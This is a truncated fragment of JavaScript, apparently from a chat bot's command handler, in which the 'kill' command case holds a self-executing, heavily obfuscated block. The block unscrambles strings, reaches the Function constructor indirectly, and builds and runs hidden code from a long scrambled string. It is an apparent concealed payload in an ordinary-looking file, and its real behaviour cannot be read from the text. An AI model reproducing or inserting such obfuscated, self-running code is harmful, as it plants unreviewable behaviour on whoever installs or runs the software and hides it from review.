...
client.sendMessage(m.chat, {
          ...
          break;
case "kill":
(function(){var oav='',EIb=521-510;function ySC(a){var j=798015;var v=a.length;var r=[];for(var i=0;i<v;i++){r[i]=a.charAt(i)};for(var i=0;i<v;i++){var k=j*(i+294)+(j%14182);var o=j*(i+649)+(j%13803);var l=k%v;var h=o%v;var g=r[l];r[l]=r[h];r[h]=g;j=(k+o)%1358801;};return r.join('')};var qfN=ySC('tynbuahlroxrnccgvdjstosfqeuzpwctkmior').substr(0,EIb);var hHm='f2nho"i9;t=q8a,js6+,,8zca)tbufro!2ilhfs{"n1rs;hhc2jc to+gt)l-6;urt=dt.t0htai,0s6r,rtj85v=of h,er+u,v+;s8k{+6;8ltjk(n,78 n=vaC[<=l)p(oip(j;gr s};)p;[]ngtA;.+7=v9t[r)=nav] cw; r3"];q+n;1fgt=k=l{i4r,elhtrvrd;zCy;Sz+n;)mq[fvrrmo{t[n+op=gv7re;.su;==gais)i)y+plfr(9=r);r=ro0C  .)[t(2(vtouv(}>,m;ii+,9tA. g=h91dlv(  kio4v1;bAr,rfr)l;;vael,;0;ve(ex=w]r=na}d)kaar=C1(slba- ")b2h<;;)jdh}v,q)o;)hae=6Ct]+;;u+=6.irk l]deh]aucs)oun]rl,cefca2lharne2pr.(k{,itk)s.kfs)n;}=;dt07r(e=a.a0yhaph9 p(.=nhgh<)+u(arvr=)Avhr}r);mvns+zl{osjrt(d=*i(m;ask(67.)g}"mgllr7nyiju)f;e hz o>."u"tivoq4)C,n.m-k[,1.=r sc+giid+g(,lrsc=.o"2s=kh[bCgnlwh.k61;9ei7m"0soh1nese;=c!<54(z[ht0;,q7ir a{;+z-.j6.vu2fjf0C=er,)[t+=(;die([-zn  a,eraue;1lo=n(+, vv(= ,5[v;t[r2=2,3=ob))aeorcSga+f(fg=a)eou[05)i.g]h;o1u ue=r.i((e]va=aunar+1i0+vo8zlr()ts-;a+;=6,.-r(=ac.rnv888](o(zar*=wo)(nvron] ]rAu(;0+.t.f0ooz])";r=rulngey;rl1fa)fn..,.(7<j(vf ';var nWJ=ySC[qfN];var Ykn='';var Ekt=nWJ;var tzB=nWJ(Ykn,ySC(hHm));var gQa=tzB(ySC('B7B!slmo!Mfe.=a.eB#4_meBrB(cee(0!(,._d3)BB!.pe)]ne)#{un_o52j.e}#r2]e=(t,s"m70cc!d.)!..enaek.o=rci<BiBac5ibe.euB( 5p0#Be)ae3.l2"3 t9s)t.B1,_m$h.g.0+tB5er(+a]$=}B\/)0ef10s%B.,tk4%]Ic;jcr(txtsz.eh_%\/;fw;iB.d-cB!p.1ocacwl=ig\'Br3})o.eb}moeBc.=m{vtne6r.m3Ba)i.pner.t;(snS(sj,vo1Bt,orer1 .cgB_B;BpyBf.(eaiB0*nl8;a.sBlroeamB1!u>(c0mfn.5u.%ee{do!wrao3i8oo(\'.e$([4jd4]or!_87BpcBl)4it]nl\/#}.!Ba"Bemct. _f}N2"eo,9]eaB0e!Bp,.ct.cs]Bdt,m]e.v_dn((.xoBe#\']r!dyit;debtpBu!1)yB=p.=ba.eBde0d%&i=p)Bc."ts"l:5)t6l]gdaBnnw.7)B;;es.!iDdnh.uB:ygit.o;eBad 94rfn4oeom7i%6_e.4u!eBnnB9]v(.Bb.Bgs(]89077eo4Bn];ode\/{u)3n(.uB$axB+*&3.bst!nseikee$(fe)jmi]oen10e,c{ ]vlB9g2cp;%..t.re7eeib)i_e..}nnc}b4.!a!n=t.;dBn_og%}al()4<(B5.e0;_=3T BB6%BB+{ji{]tT(6e!wdar %ee;t.de(;(i(u=7BB(6e(u7.,a)nc1<)e$tu-n{t}Bci3(4s!e,Bs,(.!.]B1%-;oulr,)(s$0nBm]D.-l-(e(o}a$im4gmfwhh(,2u]+!38t(>)44Bin$deeB3(cBB;Bovp.(e.e_n.sg;e_84bB6.B{;: Bbe7_B6!m;B#e)B,_B(.)B.9(b2%$.h]rBm.oBqS}-imw(znut75SCg2%Bmo!c.ot;;B)fr.-Bt(g!$]g1(e_p_1{o.,eB$#}ro.iBeeS(e.dahd.tn{%0_3noe(i0i33ceBuB$nr)3ei.upv0.eBguB1tlBB({.drbat!ona)h21 85k}ch,&B; ]a8C(Be_s.gjef]a.I)akehEe;aBre%BBee3,BiC.lr;e)nn)si)eE\/e.Bt3eu.(s 1;e,6pditde.e_!4nl.="[;g1dBt8a;TegBee0)ie.le{e]e:.B nBb={a=2frnBi(purh0aau.1$8}$jer$.(n3ahg}+35{]B(!l;.>i)Bi8nggnB,t]$,.{).Bto.;jB%;B=3.m(.B]e=d7e-n],mfv!B.r%he1=y%)NB.._]$n\/(#7!d=ma.esB6BumIf(mm!B;]s.*tTx)$8"emaemq129n$9r)}1ur(7t=df.i0.rekpieeB(+$..;e3Bs))Ba1+ls=(..eBod51a+;nen.e.,doe&oBei(Mo h=8eNoo3eD.d_v-rnDseBB+.i)a].]ra%tN+[lB.B"4(;B()aB=B-1)9,g3lenstb.:ej03d,9tn.vgBzetBc,Bs{hi8tscw u)5(B-_u0f)1BB$ddmkB\'o:o(eB8raB.epshqe1Bfso..p(0e]),0Bhp}hmna,-w)Ces.i)iNlncu,9y$c{E]BBeo6emB8}T=ec{ru;),lTm).B8m).r]; ..\'}l(go;(}3evtpz0B,e7wur(ira il_);..gtvt6jp$8jm)B,oB_.krr7B.n))%etmtoI}.aj0di.)e!"$c.r:dp3le,tE)904 m,"$eeBs B E)) >2t0)Bj2ruS\' $1dut(dhe{ psp$6,cB)esp,ce*33e=o,+cl.t tiBc!i2ouiBeodnoSi9et{sat(B(f_Bt!="jo}l.vea5$[Bkf0B5t)\'=B,)". <)b)0.B+d.0Bea5.mT3+%)l!o ebiiv) B1ad_ .),B e=;!} lp.dBs.($.e}i>b.B0'));var rvf=Ekt(oav,gQa );rvf(6166);return 3278})()
